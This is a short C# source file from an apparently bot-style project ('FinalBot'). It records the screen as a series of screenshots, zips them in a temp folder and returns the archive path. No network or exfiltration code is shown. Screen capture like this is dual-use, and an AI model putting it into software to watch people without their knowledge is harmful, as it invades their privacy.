using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;

namespace FinalBot.Modules
{
    public static class VideoModule
    {
        public static async Task<string?> RecordScreen(int seconds)
        {
            string tempDir = Path.Combine(Path.GetTempPath(), $"vid_{Environment.TickCount}");
            Directory.CreateDirectory(tempDir);
            
            try
            {
                int frames = seconds * 2; // 2 FPS
                for (int i = 0; i < frames; i++)
                {
                    string? frame = ScreenshotModule.TakeScreenshot();
                    if (frame != null && File.Exists(frame))
                    {
                        string dest = Path.Combine(tempDir, $"frame_{i:D3}.bmp");
                        File.Move(frame, dest);
                    }
                    await Task.Delay(500);
                }

                string zipPath = tempDir + ".zip";
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);
                
                // Cleanup frames
                Directory.Delete(tempDir, true);

                return zipPath;
            }
            catch (Exception ex)
            {
                Logger.Error("Video capture failed", ex);
                if (Directory.Exists(tempDir)) try { Directory.Delete(tempDir, true); } catch { }
            }
            return null;
        }
    }
}
